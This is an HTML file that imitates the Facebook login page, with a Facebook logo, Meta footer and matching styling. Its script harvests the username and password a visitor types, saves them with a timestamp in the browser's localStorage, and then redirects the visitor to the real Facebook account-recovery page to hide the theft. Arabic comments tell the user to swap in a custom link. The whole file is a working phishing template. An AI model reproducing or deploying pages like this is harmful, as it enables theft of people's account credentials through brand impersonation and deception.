<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f0f2f5, #ffffff);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .language {
            text-align: right;
            font-size: 14px;
            color: #888;
            margin-bottom: 10px;
        }

        .facebook-logo {
            width: 50px;
            margin: 20px auto;
        }

        .login-form {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .login-form input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        .login-form button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-form button:hover {
            background-color: #165dbb;
        }

        .forgot-password {
            display: block;
            margin: 15px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .create-account {
            margin-top: 20px;
            padding: 12px;
            width: 100%;
            border: 1px solid #1877f2;
            color: #1877f2;
            background: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        .create-account:hover {
            background-color: #e7f3ff;
        }

        footer {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }

        footer a {
            text-decoration: none;
            color: gray;
        }

        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="language">English (UK)</div>
        <img src="images/facebook-logo.png" alt="Facebook Logo" class="facebook-logo">
        <div class="login-form">
            <form onsubmit="handleLogin(event)">
                <input id="username" type="text" placeholder="Mobile number or email address" required>
                <input id="password" type="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <a href="#" class="forgot-password">Forgotten Password?</a>
        </div>
        <button class="create-account">Create new account</button>
        <footer>
            <p>Meta © 2024</p>
        </footer>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // تخزين البيانات في localStorage
            const logins = JSON.parse(localStorage.getItem('logins')) || [];
            logins.push({ username, password, time: new Date().toLocaleString() });
            localStorage.setItem('logins', JSON.stringify(logins));

            // إعادة التوجيه إلى الرابط المخصص
            window.location.href = 'https://m.facebook.com/login/identify/'; // استبدل بالرابط المخصص
        }
    </script>
</body>
</html>
